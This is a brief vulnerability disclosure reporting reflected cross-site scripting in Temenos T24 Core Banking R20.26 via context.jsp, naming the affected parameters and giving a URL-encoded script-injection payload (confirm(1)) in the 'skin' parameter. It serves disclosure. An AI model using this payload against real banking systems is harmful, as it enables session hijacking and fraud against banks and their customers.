### In T24 Temenos Core Banking Version R20.26 , I found Reflected XSS in BrowserWeb/jsps/context.jsp

Affected Version- R20.26

Parameter Affected: skin, ceids, enqids, enqdesc, olddata, formid, noRightClick

### Reproduce bug:

Create request to https://localhost/BrowserWeb/jsps/context.jsp with payload xss in 'skin' parameter

Payload : `aaaaaaaakhad8%22%3e%3cscript%3econfirm(1)%3c%2fscript%3ekic5k`

![](./context_2.png)

After that xss payload trigger 

![](./context_1.png)
